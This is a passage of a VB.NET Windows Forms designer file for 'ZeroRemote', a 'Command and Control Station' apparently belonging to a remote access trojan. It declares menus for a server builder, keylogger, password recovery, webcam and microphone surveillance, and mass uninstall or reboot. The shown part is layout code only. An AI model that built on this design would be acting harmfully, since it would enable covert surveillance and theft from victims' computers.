        Me.ImageListFlags.Images.SetKeyName(38, "cd.png")
        Me.ImageListFlags.Images.SetKeyName(39, "cf.png")
        Me.ImageListFlags.Images.SetKeyName(40, "cg.png")
        Me.ImageListFlags.Images.SetKeyName(41, "ch.png")
        Me.ImageListFlags.Images.SetKeyName(42, "ci.png")
        Me.ImageListFlags.Images.SetKeyName(43, "ck.png")
        Me.ImageListFlags.Images.SetKeyName(44, "cl.png")
        Me.ImageListFlags.Images.SetKeyName(45, "cm.png")
        Me.ImageListFlags.Images.SetKeyName(46, "cn.png")
        Me.ImageListFlags.Images.SetKeyName(47, "co.png")
        Me.ImageListFlags.Images.SetKeyName(48, "cr.png")
        Me.ImageListFlags.Images.SetKeyName(49, "cs.png")
        Me.ImageListFlags.Images.SetKeyName(50, "cu.png")
        Me.ImageListFlags.Images.SetKeyName(51, "cv.png")
        Me.ImageListFlags.Images.SetKeyName(52, "cx.png")
        Me.ImageListFlags.Images.SetKeyName(53, "cy.png")
        Me.ImageListFlags.Images.SetKeyName(54, "cz.png")
        Me.ImageListFlags.Images.SetKeyName(55, "de.png")
        Me.ImageListFlags.Images.SetKeyName(56, "default.png")
        Me.ImageListFlags.Images.SetKeyName(57, "dj.png")
        Me.ImageListFlags.Images.SetKeyName(58, "dk.png")
        Me.ImageListFlags.Images.SetKeyName(59, "dm.png")
        Me.ImageListFlags.Images.SetKeyName(60, "do.png")
        Me.ImageListFlags.Images.SetKeyName(61, "dz.png")
        Me.ImageListFlags.Images.SetKeyName(62, "ec.png")
        Me.ImageListFlags.Images.SetKeyName(63, "ee.png")
        Me.ImageListFlags.Images.SetKeyName(64, "eg.png")
        Me.ImageListFlags.Images.SetKeyName(65, "eh.png")
        Me.ImageListFlags.Images.SetKeyName(66, "england.png")
        Me.ImageListFlags.Images.SetKeyName(67, "er.png")
        Me.ImageListFlags.Images.SetKeyName(68, "es.png")
        Me.ImageListFlags.Images.SetKeyName(69, "et.png")
        Me.ImageListFlags.Images.SetKeyName(70, "fam.png")
        Me.ImageListFlags.Images.SetKeyName(71, "fi.png")
        Me.ImageListFlags.Images.SetKeyName(72, "fj.png")
        Me.ImageListFlags.Images.SetKeyName(73, "fk.png")
        Me.ImageListFlags.Images.SetKeyName(74, "fm.png")
        Me.ImageListFlags.Images.SetKeyName(75, "fo.png")
        Me.ImageListFlags.Images.SetKeyName(76, "fr.png")
        Me.ImageListFlags.Images.SetKeyName(77, "ga.png")
        Me.ImageListFlags.Images.SetKeyName(78, "gb.png")
        Me.ImageListFlags.Images.SetKeyName(79, "gd.png")
        Me.ImageListFlags.Images.SetKeyName(80, "ge.png")
        Me.ImageListFlags.Images.SetKeyName(81, "gf.png")
        Me.ImageListFlags.Images.SetKeyName(82, "gh.png")
        Me.ImageListFlags.Images.SetKeyName(83, "gi.png")
        Me.ImageListFlags.Images.SetKeyName(84, "gl.png")
        Me.ImageListFlags.Images.SetKeyName(85, "gm.png")
        Me.ImageListFlags.Images.SetKeyName(86, "gn.png")
        Me.ImageListFlags.Images.SetKeyName(87, "gp.png")
        Me.ImageListFlags.Images.SetKeyName(88, "gq.png")
        Me.ImageListFlags.Images.SetKeyName(89, "gr.png")
        Me.ImageListFlags.Images.SetKeyName(90, "gs.png")
        Me.ImageListFlags.Images.SetKeyName(91, "gt.png")
        Me.ImageListFlags.Images.SetKeyName(92, "gu.png")
        Me.ImageListFlags.Images.SetKeyName(93, "gw.png")
        Me.ImageListFlags.Images.SetKeyName(94, "gy.png")
        Me.ImageListFlags.Images.SetKeyName(95, "hk.png")
        Me.ImageListFlags.Images.SetKeyName(96, "hm.png")
        Me.ImageListFlags.Images.SetKeyName(97, "hn.png")
        Me.ImageListFlags.Images.SetKeyName(98, "hr.png")
        Me.ImageListFlags.Images.SetKeyName(99, "ht.png")
        Me.ImageListFlags.Images.SetKeyName(100, "hu.png")
        Me.ImageListFlags.Images.SetKeyName(101, "id.png")
        Me.ImageListFlags.Images.SetKeyName(102, "ie.png")
        Me.ImageListFlags.Images.SetKeyName(103, "il.png")
        Me.ImageListFlags.Images.SetKeyName(104, "in.png")
        Me.ImageListFlags.Images.SetKeyName(105, "io.png")
        Me.ImageListFlags.Images.SetKeyName(106, "iq.png")
        Me.ImageListFlags.Images.SetKeyName(107, "ir.png")
        Me.ImageListFlags.Images.SetKeyName(108, "is.png")
        Me.ImageListFlags.Images.SetKeyName(109, "it.png")
        Me.ImageListFlags.Images.SetKeyName(110, "jm.png")
        Me.ImageListFlags.Images.SetKeyName(111, "jo.png")
        Me.ImageListFlags.Images.SetKeyName(112, "jp.png")
        Me.ImageListFlags.Images.SetKeyName(113, "ke.png")
        Me.ImageListFlags.Images.SetKeyName(114, "kg.png")
        Me.ImageListFlags.Images.SetKeyName(115, "kh.png")
        Me.ImageListFlags.Images.SetKeyName(116, "ki.png")
        Me.ImageListFlags.Images.SetKeyName(117, "km.png")
        Me.ImageListFlags.Images.SetKeyName(118, "kn.png")
        Me.ImageListFlags.Images.SetKeyName(119, "kp.png")
        Me.ImageListFlags.Images.SetKeyName(120, "kr.png")
        Me.ImageListFlags.Images.SetKeyName(121, "kw.png")
        Me.ImageListFlags.Images.SetKeyName(122, "ky.png")
        Me.ImageListFlags.Images.SetKeyName(123, "kz.png")
        Me.ImageListFlags.Images.SetKeyName(124, "la.png")
        Me.ImageListFlags.Images.SetKeyName(125, "lb.png")
        Me.ImageListFlags.Images.SetKeyName(126, "lc.png")
        Me.ImageListFlags.Images.SetKeyName(127, "li.png")
        Me.ImageListFlags.Images.SetKeyName(128, "lk.png")
        Me.ImageListFlags.Images.SetKeyName(129, "lr.png")
        Me.ImageListFlags.Images.SetKeyName(130, "ls.png")
        Me.ImageListFlags.Images.SetKeyName(131, "lt.png")
        Me.ImageListFlags.Images.SetKeyName(132, "lu.png")
        Me.ImageListFlags.Images.SetKeyName(133, "lv.png")
        Me.ImageListFlags.Images.SetKeyName(134, "ly.png")
        Me.ImageListFlags.Images.SetKeyName(135, "ma.png")
        Me.ImageListFlags.Images.SetKeyName(136, "mc.png")
        Me.ImageListFlags.Images.SetKeyName(137, "md.png")
        Me.ImageListFlags.Images.SetKeyName(138, "me.png")
        Me.ImageListFlags.Images.SetKeyName(139, "mg.png")
        Me.ImageListFlags.Images.SetKeyName(140, "mh.png")
        Me.ImageListFlags.Images.SetKeyName(141, "mk.png")
        Me.ImageListFlags.Images.SetKeyName(142, "ml.png")
        Me.ImageListFlags.Images.SetKeyName(143, "mm.png")
        Me.ImageListFlags.Images.SetKeyName(144, "mn.png")
        Me.ImageListFlags.Images.SetKeyName(145, "mo.png")
        Me.ImageListFlags.Images.SetKeyName(146, "mp.png")
        Me.ImageListFlags.Images.SetKeyName(147, "mq.png")
        Me.ImageListFlags.Images.SetKeyName(148, "mr.png")
        Me.ImageListFlags.Images.SetKeyName(149, "ms.png")
        Me.ImageListFlags.Images.SetKeyName(150, "mt.png")
        Me.ImageListFlags.Images.SetKeyName(151, "mu.png")
        Me.ImageListFlags.Images.SetKeyName(152, "mv.png")
        Me.ImageListFlags.Images.SetKeyName(153, "mw.png")
        Me.ImageListFlags.Images.SetKeyName(154, "mx.png")
        Me.ImageListFlags.Images.SetKeyName(155, "my.png")
        Me.ImageListFlags.Images.SetKeyName(156, "mz.png")
        Me.ImageListFlags.Images.SetKeyName(157, "na.png")
        Me.ImageListFlags.Images.SetKeyName(158, "nc.png")
        Me.ImageListFlags.Images.SetKeyName(159, "ne.png")
        Me.ImageListFlags.Images.SetKeyName(160, "nf.png")
        Me.ImageListFlags.Images.SetKeyName(161, "ng.png")
        Me.ImageListFlags.Images.SetKeyName(162, "ni.png")
        Me.ImageListFlags.Images.SetKeyName(163, "nl.png")
        Me.ImageListFlags.Images.SetKeyName(164, "no.png")
        Me.ImageListFlags.Images.SetKeyName(165, "np.png")
        Me.ImageListFlags.Images.SetKeyName(166, "nr.png")
        Me.ImageListFlags.Images.SetKeyName(167, "nu.png")
        Me.ImageListFlags.Images.SetKeyName(168, "nz.png")
        Me.ImageListFlags.Images.SetKeyName(169, "om.png")
        Me.ImageListFlags.Images.SetKeyName(170, "pa.png")
        Me.ImageListFlags.Images.SetKeyName(171, "pe.png")
        Me.ImageListFlags.Images.SetKeyName(172, "pf.png")
        Me.ImageListFlags.Images.SetKeyName(173, "pg.png")
        Me.ImageListFlags.Images.SetKeyName(174, "ph.png")
        Me.ImageListFlags.Images.SetKeyName(175, "pk.png")
        Me.ImageListFlags.Images.SetKeyName(176, "pl.png")
        Me.ImageListFlags.Images.SetKeyName(177, "pm.png")
        Me.ImageListFlags.Images.SetKeyName(178, "pn.png")
        Me.ImageListFlags.Images.SetKeyName(179, "pr.png")
        Me.ImageListFlags.Images.SetKeyName(180, "ps.png")
        Me.ImageListFlags.Images.SetKeyName(181, "pt.png")
        Me.ImageListFlags.Images.SetKeyName(182, "pw.png")
        Me.ImageListFlags.Images.SetKeyName(183, "py.png")
        Me.ImageListFlags.Images.SetKeyName(184, "qa.png")
        Me.ImageListFlags.Images.SetKeyName(185, "re.png")
        Me.ImageListFlags.Images.SetKeyName(186, "ro.png")
        Me.ImageListFlags.Images.SetKeyName(187, "rs.png")
        Me.ImageListFlags.Images.SetKeyName(188, "ru.png")
        Me.ImageListFlags.Images.SetKeyName(189, "rw.png")
        Me.ImageListFlags.Images.SetKeyName(190, "sa.png")
        Me.ImageListFlags.Images.SetKeyName(191, "sb.png")
        Me.ImageListFlags.Images.SetKeyName(192, "sc.png")
        Me.ImageListFlags.Images.SetKeyName(193, "scotland.png")
        Me.ImageListFlags.Images.SetKeyName(194, "sd.png")
        Me.ImageListFlags.Images.SetKeyName(195, "se.png")
        Me.ImageListFlags.Images.SetKeyName(196, "sg.png")
        Me.ImageListFlags.Images.SetKeyName(197, "sh.png")
        Me.ImageListFlags.Images.SetKeyName(198, "si.png")
        Me.ImageListFlags.Images.SetKeyName(199, "sj.png")
        Me.ImageListFlags.Images.SetKeyName(200, "sk.png")
        Me.ImageListFlags.Images.SetKeyName(201, "sl.png")
        Me.ImageListFlags.Images.SetKeyName(202, "sm.png")
        Me.ImageListFlags.Images.SetKeyName(203, "sn.png")
        Me.ImageListFlags.Images.SetKeyName(204, "so.png")
        Me.ImageListFlags.Images.SetKeyName(205, "sr.png")
        Me.ImageListFlags.Images.SetKeyName(206, "st.png")
        Me.ImageListFlags.Images.SetKeyName(207, "sv.png")
        Me.ImageListFlags.Images.SetKeyName(208, "sy.png")
        Me.ImageListFlags.Images.SetKeyName(209, "sz.png")
        Me.ImageListFlags.Images.SetKeyName(210, "tc.png")
        Me.ImageListFlags.Images.SetKeyName(211, "td.png")
        Me.ImageListFlags.Images.SetKeyName(212, "tf.png")
        Me.ImageListFlags.Images.SetKeyName(213, "tg.png")
        Me.ImageListFlags.Images.SetKeyName(214, "th.png")
        Me.ImageListFlags.Images.SetKeyName(215, "tj.png")
        Me.ImageListFlags.Images.SetKeyName(216, "tk.png")
        Me.ImageListFlags.Images.SetKeyName(217, "tl.png")
        Me.ImageListFlags.Images.SetKeyName(218, "tm.png")
        Me.ImageListFlags.Images.SetKeyName(219, "tn.png")
        Me.ImageListFlags.Images.SetKeyName(220, "to.png")
        Me.ImageListFlags.Images.SetKeyName(221, "tr.png")
        Me.ImageListFlags.Images.SetKeyName(222, "tt.png")
        Me.ImageListFlags.Images.SetKeyName(223, "tv.png")
        Me.ImageListFlags.Images.SetKeyName(224, "tw.png")
        Me.ImageListFlags.Images.SetKeyName(225, "tz.png")
        Me.ImageListFlags.Images.SetKeyName(226, "ua.png")
        Me.ImageListFlags.Images.SetKeyName(227, "ug.png")
        Me.ImageListFlags.Images.SetKeyName(228, "um.png")
        Me.ImageListFlags.Images.SetKeyName(229, "us.png")
        Me.ImageListFlags.Images.SetKeyName(230, "uy.png")
        Me.ImageListFlags.Images.SetKeyName(231, "uz.png")
        Me.ImageListFlags.Images.SetKeyName(232, "va.png")
        Me.ImageListFlags.Images.SetKeyName(233, "vc.png")
        Me.ImageListFlags.Images.SetKeyName(234, "ve.png")
        Me.ImageListFlags.Images.SetKeyName(235, "vg.png")
        Me.ImageListFlags.Images.SetKeyName(236, "vi.png")
        Me.ImageListFlags.Images.SetKeyName(237, "vn.png")
        Me.ImageListFlags.Images.SetKeyName(238, "vu.png")
        Me.ImageListFlags.Images.SetKeyName(239, "wales.png")
        Me.ImageListFlags.Images.SetKeyName(240, "wf.png")
        Me.ImageListFlags.Images.SetKeyName(241, "ws.png")
        Me.ImageListFlags.Images.SetKeyName(242, "ye.png")
        Me.ImageListFlags.Images.SetKeyName(243, "yt.png")
        Me.ImageListFlags.Images.SetKeyName(244, "za.png")
        Me.ImageListFlags.Images.SetKeyName(245, "zm.png")
        Me.ImageListFlags.Images.SetKeyName(246, "zw.png")
        '
        'MenuStripControl
        '
        Me.MenuStripControl.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.MenuStripControl.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem1, Me.BuilderToolStripMenuItem, Me.SettingsToolStripMenuItem, Me.AboutToolStripMenuItem})
        Me.MenuStripControl.Location = New System.Drawing.Point(0, 0)
        Me.MenuStripControl.Name = "MenuStripControl"
        Me.MenuStripControl.Padding = New System.Windows.Forms.Padding(7, 2, 0, 2)
        Me.MenuStripControl.Size = New System.Drawing.Size(598, 24)
        Me.MenuStripControl.TabIndex = 1
        Me.MenuStripControl.Text = "MenuStrip1"
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ConnectToToolStripMenuItem, Me.DisconnectToolStripMenuItem})
        Me.ToolStripMenuItem1.Image = CType(resources.GetObject("ToolStripMenuItem1.Image"), System.Drawing.Image)
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(99, 20)
        Me.ToolStripMenuItem1.Text = "Connection"
        '
        'ConnectToToolStripMenuItem
        '
        Me.ConnectToToolStripMenuItem.Image = CType(resources.GetObject("ConnectToToolStripMenuItem.Image"), System.Drawing.Image)
        Me.ConnectToToolStripMenuItem.Name = "ConnectToToolStripMenuItem"
        Me.ConnectToToolStripMenuItem.Size = New System.Drawing.Size(136, 22)
        Me.ConnectToToolStripMenuItem.Text = "Connect to"
        '
        'DisconnectToolStripMenuItem
        '
        Me.DisconnectToolStripMenuItem.Image = CType(resources.GetObject("DisconnectToolStripMenuItem.Image"), System.Drawing.Image)
        Me.DisconnectToolStripMenuItem.Name = "DisconnectToolStripMenuItem"
        Me.DisconnectToolStripMenuItem.Size = New System.Drawing.Size(136, 22)
        Me.DisconnectToolStripMenuItem.Text = "Disconnect"
        '
        'BuilderToolStripMenuItem
        '
        Me.BuilderToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CreateServerToolStripMenuItem, Me.CreatePHPFilesToolStripMenuItem})
        Me.BuilderToolStripMenuItem.Image = CType(resources.GetObject("BuilderToolStripMenuItem.Image"), System.Drawing.Image)
        Me.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem"
        Me.BuilderToolStripMenuItem.Size = New System.Drawing.Size(75, 20)
        Me.BuilderToolStripMenuItem.Text = "Builder"
        '
        'CreateServerToolStripMenuItem
        '
        Me.CreateServerToolStripMenuItem.Image = CType(resources.GetObject("CreateServerToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CreateServerToolStripMenuItem.Name = "CreateServerToolStripMenuItem"
        Me.CreateServerToolStripMenuItem.Size = New System.Drawing.Size(166, 22)
        Me.CreateServerToolStripMenuItem.Text = "Create Server"
        '
        'CreatePHPFilesToolStripMenuItem
        '
        Me.CreatePHPFilesToolStripMenuItem.Image = CType(resources.GetObject("CreatePHPFilesToolStripMenuItem.Image"), System.Drawing.Image)
        Me.CreatePHPFilesToolStripMenuItem.Name = "CreatePHPFilesToolStripMenuItem"
        Me.CreatePHPFilesToolStripMenuItem.Size = New System.Drawing.Size(166, 22)
        Me.CreatePHPFilesToolStripMenuItem.Text = "Create PHP files"
        '
        'SettingsToolStripMenuItem
        '
        Me.SettingsToolStripMenuItem.Image = CType(resources.GetObject("SettingsToolStripMenuItem.Image"), System.Drawing.Image)
        Me.SettingsToolStripMenuItem.Name = "SettingsToolStripMenuItem"
        Me.SettingsToolStripMenuItem.Size = New System.Drawing.Size(81, 20)
        Me.SettingsToolStripMenuItem.Text = "Settings"
        '
        'AboutToolStripMenuItem
        '
        Me.AboutToolStripMenuItem.Image = CType(resources.GetObject("AboutToolStripMenuItem.Image"), System.Drawing.Image)
        Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(68, 20)
        Me.AboutToolStripMenuItem.Text = "About"
        '
        'ImageListGeneral
        '
        Me.ImageListGeneral.ImageStream = CType(resources.GetObject("ImageListGeneral.ImageStream"), System.Windows.Forms.ImageListStreamer)
        Me.ImageListGeneral.TransparentColor = System.Drawing.Color.Transparent
        Me.ImageListGeneral.Images.SetKeyName(0, "globe-network-ethernet.png")
        '
        'NotifyIconWelcome
        '
        Me.NotifyIconWelcome.BalloonTipIcon = System.Windows.Forms.ToolTipIcon.Info
        Me.NotifyIconWelcome.BalloonTipText = "dsf"
        Me.NotifyIconWelcome.BalloonTipTitle = "sdfsdf"
        Me.NotifyIconWelcome.Icon = CType(resources.GetObject("NotifyIconWelcome.Icon"), System.Drawing.Icon)
        Me.NotifyIconWelcome.Text = "ZeroRemote"
        Me.NotifyIconWelcome.Visible = True
        '
        'StatusStrip1
        '
        Me.StatusStrip1.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.StatusStrip1.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripStatusCaption, Me.ToolStripStatus, Me.ToolStripUsersOnline})
        Me.StatusStrip1.Location = New System.Drawing.Point(0, 305)
        Me.StatusStrip1.Name = "StatusStrip1"
        Me.StatusStrip1.Padding = New System.Windows.Forms.Padding(1, 0, 16, 0)
        Me.StatusStrip1.Size = New System.Drawing.Size(598, 22)
        Me.StatusStrip1.TabIndex = 2
        Me.StatusStrip1.Text = "StatusStrip1"
        '
        'ToolStripStatusCaption
        '
        Me.ToolStripStatusCaption.Name = "ToolStripStatusCaption"
        Me.ToolStripStatusCaption.Size = New System.Drawing.Size(48, 17)
        Me.ToolStripStatusCaption.Text = "Status:"
        '
        'ToolStripStatus
        '
        Me.ToolStripStatus.ForeColor = System.Drawing.Color.Red
        Me.ToolStripStatus.Name = "ToolStripStatus"
        Me.ToolStripStatus.Size = New System.Drawing.Size(56, 17)
        Me.ToolStripStatus.Text = "Disabled"
        '
        'ToolStripUsersOnline
        '
        Me.ToolStripUsersOnline.Name = "ToolStripUsersOnline"
        Me.ToolStripUsersOnline.Size = New System.Drawing.Size(101, 17)
        Me.ToolStripUsersOnline.Text = "  Connections: 0"
        '
        'MicrophoneToolStripMenuItem
        '
        Me.MicrophoneToolStripMenuItem.Image = CType(resources.GetObject("MicrophoneToolStripMenuItem.Image"), System.Drawing.Image)
        Me.MicrophoneToolStripMenuItem.Name = "MicrophoneToolStripMenuItem"
        Me.MicrophoneToolStripMenuItem.Size = New System.Drawing.Size(161, 22)
        Me.MicrophoneToolStripMenuItem.Text = "Microphone"
        '
        'Main
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(598, 327)
        Me.Controls.Add(Me.StatusStrip1)
        Me.Controls.Add(Me.ListViewMain)
        Me.Controls.Add(Me.MenuStripControl)
        Me.Font = New System.Drawing.Font("Verdana", 8.25!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MinimumSize = New System.Drawing.Size(600, 351)
        Me.Name = "Main"
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.Text = " ZeroRemote  |  Command and Control Station - Licensed to : {Username}"
        Me.TopMost = True
        Me.ContextMenuStripOptions.ResumeLayout(False)
        Me.MenuStripControl.ResumeLayout(False)
        Me.MenuStripControl.PerformLayout()
        Me.StatusStrip1.ResumeLayout(False)
        Me.StatusStrip1.PerformLayout()
        Me.ResumeLayout(False)
        Me.PerformLayout()

    End Sub


    Friend WithEvents ListViewMain As System.Windows.Forms.ListView
    Friend WithEvents MenuStripControl As System.Windows.Forms.MenuStrip
    Friend WithEvents ToolStripMenuItem1 As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ConnectToToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DisconnectToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ColumnHeaderID As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeaderUsername As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeaderComputername As System.Windows.Forms.ColumnHeader
    Friend WithEvents ColumnHeaderOperatingSystem As System.Windows.Forms.ColumnHeader
    Friend WithEvents BuilderToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SettingsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AboutToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ImageListGeneral As System.Windows.Forms.ImageList
    Friend WithEvents ColumnHeaderLocation As System.Windows.Forms.ColumnHeader
    Friend WithEvents CreateServerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CreatePHPFilesToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ContextMenuStripOptions As System.Windows.Forms.ContextMenuStrip
    Friend WithEvents ServerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents CloseToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ToolStripSeparator1 As System.Windows.Forms.ToolStripSeparator
    Friend WithEvents UninstallToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents NotifyIconWelcome As System.Windows.Forms.NotifyIcon
    Friend WithEvents DeleteFromDatabaseToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SystemManagersToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ProcessmanagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StatusStrip1 As System.Windows.Forms.StatusStrip
    Friend WithEvents ToolStripUsersOnline As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatusCaption As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ToolStripStatus As System.Windows.Forms.ToolStripStatusLabel
    Friend WithEvents ColumnHeaderVersion As System.Windows.Forms.ColumnHeader
    Friend WithEvents ServicemanagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GeneralToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SysteminformationToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ServerinformationToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RestartAsAdminToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents WindowmanagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FilemanagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SendToAllToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents UninstallAllToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SurveillanceToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ScreenviewerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents WebcamviewerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ImageListFlags As System.Windows.Forms.ImageList
    Friend WithEvents GroupUsersToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GroupByOSToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents GroupByCountryToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ColumnHeaderWebcam As System.Windows.Forms.ColumnHeader
    Friend WithEvents GroupByWebcamToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ShowNoGroupsToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RegistrymanagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents NetworkToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents NetworkviewerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents AdditionalToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents FunmanagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MessageBoxToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents RebootAllToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents ClipboardToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SoftwaremanagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents SecurityToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents PasswordRecoveryToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents KeyloggerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents DownloadmanagerToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents StartupMonitorToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem
    Friend WithEvents MicrophoneToolStripMenuItem As System.Windows.Forms.ToolStripMenuItem

End Class
